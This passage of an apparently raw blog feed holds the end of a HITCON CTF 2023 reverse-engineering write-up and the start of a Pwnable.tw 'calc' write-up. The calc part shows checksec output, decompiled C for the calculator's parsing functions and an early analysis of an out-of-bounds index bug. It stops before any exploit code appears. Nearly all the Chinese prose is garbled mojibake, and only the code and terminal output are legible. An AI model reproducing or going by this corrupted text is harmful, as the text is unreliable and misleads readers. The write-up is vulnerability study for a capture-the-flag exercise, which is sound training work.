æ²’æœ‰æ„è­˜åˆ°ï¼Œé›–ç„¶æœ‰ç™¼ç¾å¯«å…¥äº†ä¸€äº› bytes ä½†æ²’æœ‰è½‰æˆ assembly å°±å¾ˆé›£çŒœåˆ°ä»–å¾Œé¢åœ¨å¹¹å˜›ï¼Œä¸éæœ‰ç¶“é©—å¾Œä¸‹æ¬¡å°±æœƒæŠŠé€™å€‹å¯èƒ½è€ƒæ…®é€²å»ï¼Œè§£å‡ºä¾†å¾Œé¢å°±è »é †åˆ©äº†ã€‚</p></li><li><p>ç™¼ç¾å¥½ç”¨çš„æ–°å·¥å…·ï¼š<br>åœ¨å»ºç«‹åŠ å¯†æ˜ å°„è¡¨çš„æ™‚å€™è¦ºå¾—è¼¸å…¥çš„é‡è¤‡æ€§å¾ˆé«˜ï¼Œå°±æŸ¥äº†ä¸€ä¸‹ GDB æœ‰ python API å¯ä»¥ç”¨ï¼Œæœªä¾†æ„Ÿè¦ºä¹Ÿå¯ä»¥æ‡‰ç”¨åœ¨ä¸å°‘å ´å¢ƒã€‚</p></li><li><p>æ›´é »ç¹åœ°ä½¿ç”¨å‹•æ…‹åˆ†æï¼š<br>æˆ‘ç™¼ç¾è‡ªå·±å¯«é€†å‘é¡Œçš„æ™‚å€™ç”¨å‹•æ…‹åˆ†æçš„æ¯”ä¾‹éƒ½æ˜é¡¯ä¸‹é™äº†ä¸å°‘ï¼Œä½†å‹•æ…‹åˆ†ææœ‰æ™‚å€™çœŸçš„æœƒçœä¸‹ä¸å°‘éº»ç…©ï¼Œæœ‰äº›æƒ…æ³ä¸‹ç”šè‡³æ˜¯å¿…è¦çš„ï¼Œå°¤å…¶åƒæ˜¯ Rust çš„é¡Œç›®æ›´æ˜¯å¦‚æ­¤ï¼Œæœªä¾†ä¹Ÿæœƒæ›´é »ç¹çš„æ­é…å‹•æ…‹åˆ†æå»å¢åŠ è‡ªå·±é€†å‘çš„æ•ˆç‡ã€‚</p></li><li><p>ç·´ç¿’çš„æ–¹å‘ï¼š<br>é€™æ¬¡ä¹Ÿæœ‰ç™¼ç¾å¯« HITCON CTF çš„é¡Œç›®é›–ç„¶èŠ±æ™‚é–“ï¼Œä½†ç¢ºå¯¦æœƒå­¸åˆ°ä¸å°‘æ±è¥¿ï¼Œè¿‘æœŸä¹Ÿé–‹å§‹æœ‰åœ¨å¯« pwnable.tw çš„é¡Œç›®ï¼Œå¸Œæœ›èƒ½é€éé›£é¡Œé€¼è‡ªå·±è„«é›¢èˆ’é©åœˆï¼Œç„¶å¾Œæˆé•·å¾—æ›´å¿«ã€‚</p></li></ul><h2 id="0x6-References"><a href="#0x6-References" class="headerlink" title="0x6 References"></a>0x6 References</h2><p><a class="link"   href="https://trebledj.me/posts/hitcon-2023-the-blade/" >HITCON 2023 â€“ The Blade <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/Sky_WF/article/details/132796329" >hitcon2023é€†å‘ The Blade WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://hexrotor.github.io/2023/09/10/hitcon-2023-blade-wp/" >Hitcon 2023 Blade WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HITCON-CTF-2023-Full-Chain-The-Blade&quot;&gt;&lt;a href=&quot;#HITCON-CTF-2023-Full-Chain-The-Blade&quot; class=&quot;headerlink&quot; title=&quot;HITCON-CTF-2023 - Fu</summary>
      
    
    
    
    
    <category term="reverse" scheme="https://kazma.tw/tags/reverse/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="hitconctf" scheme="https://kazma.tw/tags/hitconctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw calc Writeup</title>
    <link href="https://kazma.tw/2024/02/11/Pwnable-tw-calc-Writeup/"/>
    <id>https://kazma.tw/2024/02/11/Pwnable-tw-calc-Writeup/</id>
    <published>2024-02-11T14:59:16.000Z</published>
    <updated>2024-04-19T06:35:38.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-tw-calc"><a href="#Pwnable-tw-calc" class="headerlink" title="Pwnable.tw - calc"></a>Pwnable.tw - calc</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Have you ever use Microsoft calculator?</p></blockquote><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   href="https://pwnable.tw/challenge/#3" >https://pwnable.tw/challenge/#3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>é¡Œç›®å¦‚åæ˜¯ä¸€å€‹è¨ˆç®—æ©Ÿï¼Œè·Ÿå‰é¢ä¸€æ¨£éƒ½æ˜¯ x86 çš„ binaryï¼Œç„¶å¾Œæ˜¯ statically linkedï¼Œåˆ NX æœ‰é–‹ï¼Œå¯èƒ½é«˜æ©Ÿç‡æœƒåˆ©ç”¨åˆ° ropï¼Œé€™é‚Šæœ‰å€‹å°è±¡å°±å¥½ï¼ŒåŸ·è¡Œçš„éƒ¨åˆ†æœ‰ç™¼ç¾ä¸€äº›ä¸å°‹å¸¸çš„è¼¸å‡ºï¼Œç¨å¾Œå¯ä»¥ä¾†åˆ†æé€™äº› caseã€‚</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ file ./calc</span><br><span class="line">./calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped</span><br></pre></td></tr></table></figure></div><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ checksec ./calc</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/pwnable/calc/calc&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></div><h3 id="calc"><a href="#calc" class="headerlink" title=".&#x2F;calc"></a>.&#x2F;calc</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">1+1</span><br><span class="line">2</span><br><span class="line">1/0</span><br><span class="line">prevent division by zero</span><br><span class="line">1+0</span><br><span class="line">prevent division by zero</span><br><span class="line">-50+50</span><br><span class="line">43</span><br><span class="line">+100+100</span><br><span class="line">100</span><br><span class="line">No time to waste!</span><br></pre></td></tr></table></figure></div><h2 id="0x2-Reverse-Engineering"><a href="#0x2-Reverse-Engineering" class="headerlink" title="0x2 Reverse Engineering"></a>0x2 Reverse Engineering</h2><p>ç”¨ ida åç·¨è­¯ä¸¦ä¸”æ•´ç†éå¾Œï¼Œæˆ‘å€‘å¤§è‡´å¯ä»¥ç†è§£ç¨‹å¼çš„è¡Œç‚ºå¦‚ä¸‹ï¼š</p><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">ssignal</span>(<span class="number">14</span>, timeout);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=== Welcome to SECPROG calculator ===&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">calc</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Merry Christmas!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¼¸å‡ºæ­¡è¿å¾Œå‘¼å« <code>cal()</code>ã€‚</p><h3 id="calc-1"><a href="#calc-1" class="headerlink" title="calc()"></a>calc()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> pool[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">bzero</span>(input, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">get_expr</span>((<span class="type">int</span>)input, <span class="number">1024</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">init_pool</span>(pool);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">parse_expr</span>((<span class="type">int</span>)input, pool) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pool[pool[<span class="number">0</span>]]);</span><br><span class="line">      <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç”¨ç„¡é™è¿´åœˆè®€å–ä½¿ç”¨è€…è¼¸å…¥ï¼Œå…ˆç”¨ <code>bzero()</code> åˆå§‹åŒ–å³å°‡è¦è¼¸å…¥çš„é™£åˆ—ï¼Œç”¨ <code>get_expr()</code> è®€å–ï¼Œè®€å–æˆåŠŸå¾Œç”¨ <code>init_pool()</code> åˆå§‹åŒ–çµæœé™£åˆ—ï¼Œä¸¦ä¸”å‘¼å« <code>parse_expr()</code> è¨ˆç®—çµæœï¼Œæœ€å¾Œè¼¸å‡ºç­”æ¡ˆï¼š <code>pool[pool[0]]</code> ï¼Œæ¥è‘—ç´°çœ‹ <code>get_expr()</code>ã€‚</p><h3 id="get-expr"><a href="#get-expr" class="headerlink" title="get_expr()"></a>get_expr()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">get_expr</span><span class="params">(<span class="type">int</span> user_input, <span class="type">int</span> max_input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> curr_index; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input_char; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( count &lt; max_input &amp;&amp; <span class="built_in">read</span>(<span class="number">0</span>, &amp;input_char, <span class="number">1</span>) != <span class="number">-1</span> &amp;&amp; input_char != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input_char == <span class="string">&#x27;+&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;-&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;*&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;/&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;%&#x27;</span></span><br><span class="line">      || input_char &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; input_char &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      curr_index = count++;</span><br><span class="line">      *(_BYTE *)(user_input + curr_index) = input_char;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(count + user_input) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿´åœˆæœƒåˆ¤æ–·è¼¸å…¥æ˜¯å¦ï¼š</p><ol><li>å°æ–¼ 1024 å€‹ Bytes</li><li>æˆåŠŸè®€å–å­—å…ƒ</li><li>å­—å…ƒéæ›è¡Œç¬¦è™Ÿ<br>çš†ç¬¦åˆå°±è¼¸å…¥åˆ° <code>user_input</code> çš„å°¾å·´ï¼Œæœ€å¾Œæœƒè¿”å›è¼¸å…¥çš„å¤§å°ã€‚</li></ol><h3 id="parse-expr"><a href="#parse-expr" class="headerlink" title="parse_expr()"></a>parse_expr()</h3><p>é€™éƒ¨åˆ†æœ‰é»é•·ï¼Œæˆ‘æŠŠå®ƒæ‹†é–‹ä¾†åˆ†æï¼š</p><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="type">int</span> input, _DWORD *pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> pool_index; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> point_on_input; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> operators_array_index; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> part_size; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *part_input; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> part_input_int; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> operators_array[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  point_on_input = input;</span><br><span class="line">  operators_array_index = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">bzero</span>(operators_array, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)(i + input) - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      part_size = i + input - point_on_input;</span><br><span class="line">      part_input = (<span class="type">char</span> *)<span class="built_in">malloc</span>(part_size + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(part_input, point_on_input, part_size);</span><br><span class="line">      part_input[part_size] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(part_input, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div><p>æ¥ä¸‹ä¾†ä¸€é€£ä¸²çš„åˆ¤æ–·æ˜¯è¦è™•ç†é‹ç®—çš„å…ˆå¾Œé †åºï¼Œé¦–å…ˆè¦æ˜¯ç¬¦è™Ÿæ‰èƒ½é€²å…¥æœ€å¤–å±¤ï¼Œç„¶å¾ŒæœƒæŠŠé€™å€‹ç¬¦è™Ÿå‰æœªè™•ç†çš„æ•¸å­—åˆ‡æˆ <code>part_input</code> ä¸¦ä¸”åˆ¤æ–·æ˜¯å¦ç‚º 0ï¼ˆé€™å€‹ç¨‹å¼æ‹’çµ•ä»»ä½•çš„ 0 å–®ç¨å‡ºç¾ XDï¼Œå‰é¢æ¸¬è©¦éšæ®µæœ‰ç™¼ç¾ï¼‰</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">part_input_int = <span class="built_in">atoi</span>((<span class="type">int</span>)part_input);</span><br><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  pool_index = (*pool)++;</span><br><span class="line">  pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(i + input) &amp;&amp; *(<span class="type">char</span> *)(i + <span class="number">1</span> + input) - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç¬¬ä¸€éƒ¨åˆ†æ²’å•é¡Œå¾Œå°±æœƒæŠŠåˆ‡å¡Šçš„å­—ä¸²è½‰æˆæ•´æ•¸ï¼Œå› ç‚º <code>*pool = pool[0]</code>ï¼Œæ‰€ä»¥ <code>pool_index</code> æœƒå„²å­˜ <code>pool[0]</code> ä¹‹å¾Œï¼ŒåŸ·è¡Œ<code>pool[0]+1</code> ï¼Œé€™é‚Šå¯ä»¥ç†è§£æˆ <code>pool[0] = pool.size()</code>ã€‚æŠŠåˆ‡å¡Šçš„æ•´æ•¸æ”¾åˆ° <code>pool</code> çš„æœ€å¾Œé¢ï¼Œæ¥è‘—åˆ¤æ–·ç¬¦è™Ÿå¾Œé¢æ˜¯å¦é‚„æœ‰æ±è¥¿è€Œä¸”ä¸æ˜¯ç¬¦è™Ÿï¼Œå¦å‰‡è¼¸å‡ºéŒ¯èª¤è¨Šæ¯ã€‚</p><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">      point_on_input = i + <span class="number">1</span> + input;</span><br><span class="line">      <span class="keyword">if</span> ( operators_array[operators_array_index] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + input) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( operators_array[operators_array_index] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; operators_array[operators_array_index] != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            operators_array[++operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            <span class="built_in">eval</span>(pool, operators_array[operators_array_index]);</span><br><span class="line">            operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">eval</span>(pool, operators_array[operators_array_index--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        operators_array[operators_array_index] = *(_BYTE *)(i + input);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + input) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( operators_array_index &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">eval</span>(pool, operators_array[operators_array_index--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¦‚æœç¬¦è™Ÿé™£åˆ—ä¸æ˜¯ç©ºå°±ç…§ä¸åŒæƒ…æ³ä½œé‹ç®—ï¼Œå¦å‰‡æ”¾å…¥ç›®å‰ç¬¦è™Ÿåˆ°ç¬¦è™Ÿé™£åˆ—ä¸­ï¼Œå‘¼å« <code>eval()</code> è¨ˆç®—ã€‚</p><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">eval</span><span class="params">(_DWORD *pool, <span class="type">char</span> operators)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( operators == <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - <span class="number">1</span>] += pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( operators &gt; <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( operators == <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - <span class="number">1</span>] -= pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( operators == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - <span class="number">1</span>] /= (<span class="type">int</span>)pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( operators == <span class="string">&#x27;*&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - <span class="number">1</span>] *= pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  --*pool;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¯ä»¥ç™¼ç¾ <code>eval()</code> éƒ½æ˜¯ç”¨ <code>pool[0]</code> ç•¶æˆç›¸å°ä½å€çš„ <code>base</code> ä¾†å–å…¶ä»–ä½ç½®çš„å€¼</p><h2 id="0x3-Fuzzing-Analyze"><a href="#0x3-Fuzzing-Analyze" class="headerlink" title="0x3 Fuzzing &amp; Analyze"></a>0x3 Fuzzing &amp; Analyze</h2><p>åœ¨æœ€ä¸€é–‹å§‹åŸ·è¡Œç¨‹å¼çš„æ™‚å€™æœ‰ç™¼ç¾åªè¦é–‹é ­æ˜¯ç¬¦è™Ÿçµæœå°±æ€ªæ€ªçš„ï¼Œæˆ‘å€‘ä¾†åˆ†æä¸€ä¸‹å‡ºäº†ä»€éº¼å•é¡Œï¼Œå…ˆæ‹¿ +12+34 ç•¶ä¾‹å­ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â””â”€$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+12+34</span><br><span class="line">34</span><br></pre></td></tr></table></figure></div><ul><li>ç¬¬ä¸€å€‹åŠ è™Ÿ</li></ul><ol><li>å› ç‚ºæ˜¯ç¬¦è™Ÿæœƒé€šéæœ€å¤–å±¤çš„ <code>if</code>ï¼Œä¸” <code>part_input = &#39;&#39;</code>ï¼Œä¸ç­‰æ–¼ 0 æ‰€ä»¥ä¸æœƒè¼¸å‡ºéŒ¯èª¤è¨Šæ¯ã€‚</li><li>æ¥è‘— <code>atoi</code> æœƒæŠŠç©ºå­—ä¸²è½‰æˆ 0ï¼Œæ²’æœ‰å¤§æ–¼ 0 